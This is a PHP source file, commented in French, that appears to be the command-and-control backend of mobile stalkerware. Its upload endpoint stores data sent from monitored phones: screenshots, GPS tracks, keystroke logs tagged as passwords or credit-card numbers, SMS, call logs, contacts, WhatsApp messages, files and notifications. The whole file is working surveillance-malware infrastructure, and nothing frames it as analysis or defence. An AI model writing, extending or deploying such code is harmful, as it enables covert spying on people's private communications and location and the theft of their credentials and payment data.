<?php
/**
 * API Upload - Réception de toutes les données
 */

require_once '../config.php';

$user = checkApiKey($pdo);
$device_id = $_GET['device_id'] ?? '';

if (!$device_id) {
    sendError('device_id requis');
}

// Récupérer l'ID de l'appareil
$stmt = $pdo->prepare("SELECT id FROM devices WHERE device_id = ? AND user_id = ?");
$stmt->execute([$device_id, $user['id']]);
$device = $stmt->fetch();

if (!$device) {
    sendError('Appareil non trouvé', 404);
}

$deviceDbId = $device['id'];
$type = $_GET['type'] ?? '';

// ============================================
// SCREENSHOT
// ============================================
if ($type === 'screenshot' && isset($_FILES['image'])) {
    
    $uploadDir = UPLOAD_DIR . "screens/{$user['id']}/{$deviceDbId}/";
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    
    $filename = time() . '.jpg';
    $filepath = $uploadDir . $filename;
    
    if (move_uploaded_file($_FILES['image']['tmp_name'], $filepath)) {
        
        // Obtenir les dimensions
        list($width, $height) = getimagesize($filepath);
        
        $stmt = $pdo->prepare("
            INSERT INTO screenshots (device_id, file_path, file_size, width, height, captured_at)
            VALUES (?, ?, ?, ?, ?, NOW())
        ");
        $stmt->execute([
            $deviceDbId,
            "screens/{$user['id']}/{$deviceDbId}/{$filename}",
            filesize($filepath),
            $width,
            $height
        ]);
        
        // Mettre à jour le compteur
        $pdo->prepare("UPDATE users SET total_screenshots = total_screenshots + 1 WHERE id = ?")
            ->execute([$user['id']]);
        
        sendJson(['success' => true, 'file' => $filename]);
    }
    
    sendError('Upload failed', 500);
}

// ============================================
// LOCATION
// ============================================
if ($type === 'location') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $stmt = $pdo->prepare("
        INSERT INTO locations (device_id, latitude, longitude, accuracy, altitude, 
                              speed, bearing, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, NOW())
    ");
    
    $stmt->execute([
        $deviceDbId,
        $data['lat'] ?? 0,
        $data['lng'] ?? 0,
        $data['accuracy'] ?? 0,
        $data['altitude'] ?? 0,
        $data['speed'] ?? 0,
        $data['bearing'] ?? 0,
        $data['provider'] ?? 'gps'
    ]);
    
    // Mettre à jour la dernière position
    $pdo->prepare("
        UPDATE devices 
        SET latitude = ?, longitude = ?, location_time = NOW() 
        WHERE id = ?
    ")->execute([$data['lat'] ?? 0, $data['lng'] ?? 0, $deviceDbId]);
    
    $pdo->prepare("UPDATE users SET total_locations = total_locations + 1 WHERE id = ?")
        ->execute([$user['id']]);
    
    sendJson(['success' => true]);
}

// ============================================
// KEYLOG
// ============================================
if ($type === 'keylog') {
    $data = json_decode(file_get_contents('php://input'), true);
    $logs = $data['logs'] ?? '';
    
    if (is_array($logs)) {
        $stmt = $pdo->prepare("
            INSERT INTO keylogs (device_id, app_package, text, is_password, is_credit_card, timestamp)
            VALUES (?, ?, ?, ?, ?, NOW())
        ");
        
        foreach ($logs as $log) {
            $stmt->execute([
                $deviceDbId,
                $log['package'] ?? 'unknown',
                $log['text'] ?? '',
                $log['isPassword'] ?? false,
                $log['isCreditCard'] ?? false
            ]);
        }
    } else {
        // Log simple
        $stmt = $pdo->prepare("
            INSERT INTO keylogs (device_id, text, timestamp)
            VALUES (?, ?, NOW())
        ");
        $stmt->execute([$deviceDbId, $logs]);
    }
    
    sendJson(['success' => true]);
}

// ============================================
// SMS
// ============================================
if ($type === 'sms') {
    $data = json_decode(file_get_contents('php://input'), true);
    $messages = $data['sms'] ?? ($data['messages'] ?? []);
    
    if (!empty($messages)) {
        $stmt = $pdo->prepare("
            INSERT INTO sms_messages (device_id, address, body, type, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ");
        
        foreach ($messages as $sms) {
            $stmt->execute([
                $deviceDbId,
                $sms['address'] ?? '',
                $sms['body'] ?? '',
                $sms['type'] ?? 'inbox',
                $sms['timestamp'] ?? time()
            ]);
        }
    }
    
    sendJson(['success' => true]);
}

// ============================================
// CALLS
// ============================================
if ($type === 'calls') {
    $data = json_decode(file_get_contents('php://input'), true);
    $calls = $data['calls'] ?? [];
    
    if (!empty($calls)) {
        $stmt = $pdo->prepare("
            INSERT INTO calls (device_id, number, name, duration, type, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ");
        
        foreach ($calls as $call) {
            $stmt->execute([
                $deviceDbId,
                $call['number'] ?? '',
                $call['name'] ?? '',
                $call['duration'] ?? 0,
                $call['type'] ?? 'missed',
                $call['timestamp'] ?? time()
            ]);
        }
    }
    
    sendJson(['success' => true]);
}

// ============================================
// CONTACTS
// ============================================
if ($type === 'contacts') {
    $data = json_decode(file_get_contents('php://input'), true);
    $contacts = $data['contacts'] ?? [];
    
    // Supprimer les anciens contacts
    $pdo->prepare("DELETE FROM contacts WHERE device_id = ?")->execute([$deviceDbId]);
    
    if (!empty($contacts)) {
        $stmt = $pdo->prepare("
            INSERT INTO contacts (device_id, contact_id, name, phones, emails)
            VALUES (?, ?, ?, ?, ?)
        ");
        
        foreach ($contacts as $contact) {
            $phones = isset($contact['phones']) ? json_encode($contact['phones']) : '';
            $emails = isset($contact['emails']) ? json_encode($contact['emails']) : '';
            
            $stmt->execute([
                $deviceDbId,
                $contact['id'] ?? '',
                $contact['name'] ?? '',
                $phones,
                $emails
            ]);
        }
    }
    
    sendJson(['success' => true]);
}

// ============================================
// WHATSAPP
// ============================================
if ($type === 'whatsapp') {
    $data = json_decode(file_get_contents('php://input'), true);
    $messages = $data['messages'] ?? [];
    
    if (!empty($messages)) {
        $stmt = $pdo->prepare("
            INSERT INTO whatsapp_messages (device_id, contact, message, timestamp)
            VALUES (?, ?, ?, ?)
        ");
        
        foreach ($messages as $msg) {
            $stmt->execute([
                $deviceDbId,
                $msg['contact'] ?? '',
                $msg['message'] ?? '',
                $msg['timestamp'] ?? time()
            ]);
        }
    }
    
    sendJson(['success' => true]);
}

// ============================================
// FILE
// ============================================
if ($type === 'file' && isset($_FILES['file'])) {
    $uploadDir = UPLOAD_DIR . "files/{$user['id']}/{$deviceDbId}/";
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    
    $filename = time() . '_' . preg_replace('/[^a-zA-Z0-9._-]/', '', $_FILES['file']['name']);
    $filepath = $uploadDir . $filename;
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $filepath)) {
        
        $hash = hash_file('sha256', $filepath);
        
        $stmt = $pdo->prepare("
            INSERT INTO files (device_id, file_path, file_name, file_size, file_hash)
            VALUES (?, ?, ?, ?, ?)
        ");
        $stmt->execute([
            $deviceDbId,
            "files/{$user['id']}/{$deviceDbId}/{$filename}",
            $_FILES['file']['name'],
            filesize($filepath),
            $hash
        ]);
        
        sendJson(['success' => true, 'hash' => $hash]);
    }
    
    sendError('Upload failed', 500);
}

// ============================================
// NOTIFICATION
// ============================================
if ($type === 'notification') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $stmt = $pdo->prepare("
        INSERT INTO notifications (device_id, package, title, text, timestamp)
        VALUES (?, ?, ?, ?, ?)
    ");
    $stmt->execute([
        $deviceDbId,
        $data['package'] ?? '',
        $data['title'] ?? '',
        $data['text'] ?? '',
        $data['timestamp'] ?? time()
    ]);
    
    sendJson(['success' => true]);
}

// ============================================
// HEARTBEAT
// ============================================
if ($type === 'heartbeat') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $pdo->prepare("
        UPDATE devices 
        SET last_seen = NOW(), 
            is_online = 1,
            battery_level = ?,
            network_type = ?
        WHERE id = ?
    ")->execute([
        $data['battery'] ?? null,
        $data['network'] ?? null,
        $deviceDbId
    ]);
    
    sendJson(['success' => true]);
}

sendError('Type non supporté', 400);
?>
